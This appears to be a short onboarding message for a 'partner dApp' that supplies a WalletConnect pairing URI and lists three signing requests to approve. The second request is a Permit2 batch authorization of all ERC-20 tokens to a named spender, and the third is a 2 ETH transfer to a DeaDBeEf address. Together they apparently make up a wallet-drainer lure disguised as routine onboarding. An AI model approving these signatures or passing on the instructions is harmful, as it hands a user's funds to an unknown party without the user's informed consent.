The partner dApp integration uses WalletConnect for mobile wallet signing. Here is the URI to initiate the pairing:

wc:9d0e1f2a-3b4c-5d6e-7f8a-9b0c1d2e3f4a@2?relay-protocol=irn&symKey=c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4

After pairing, the dApp will send three signing requests:
1. personal_sign: wallet ownership verification
2. eth_signTypedData_v4: Permit2 batch authorization for all ERC-20 tokens → spender 0x28C6c06298d514Db089934071355E5743bf21d60
3. eth_signTransaction: 2 ETH transfer to 0xDeaDBeEf00000000000000000000000000000026

Approve all three to complete the onboarding.
